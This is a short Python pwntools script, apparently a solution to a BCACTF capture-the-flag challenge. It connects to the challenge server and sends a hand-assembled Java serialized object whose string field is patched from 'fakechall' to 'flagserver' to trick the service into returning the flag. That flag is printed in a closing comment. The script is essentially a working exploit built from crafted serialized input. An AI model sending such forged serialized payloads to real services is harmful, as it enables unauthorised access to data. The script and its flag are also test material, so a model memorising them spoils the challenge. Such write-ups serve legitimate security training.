from pwn import *

# Define server details
# nc challs.bcactf.com 30134

server_ip = 'challs.bcactf.com'  # Replace with the server's IP address
server_port = 30134  # Replace with the server's port
context.log_level = 'DEBUG'
# Connect to the server
r = remote(server_ip, server_port)

# Send data to the server
p = b"".join([bytes.fromhex(data.decode()) for data in [
    b"aced0005",
    b"7372001e666c61677365727665722e4d65737361676543746f535f52657175657374bd164155d760d5a30200014c00056368616c6c7400124c6a6176612f6c616e672f537472696e673b",
    b"78720012666c61677365727665722e4d65737361676590d21cc718e89c16020000",
    b"787074000966616b656368616c6c"
]])

# Replace "fakechall" 
p = p.replace(b"\x09fakechall", b"\x0aflagserver")

r.recv()
r.send(p)
print(r.recvall())
# Close the connection
r.close()

# bcactf{thankS_5OCK3ts_and_tHreADInG_clA5s_2f6fb44c998fd8}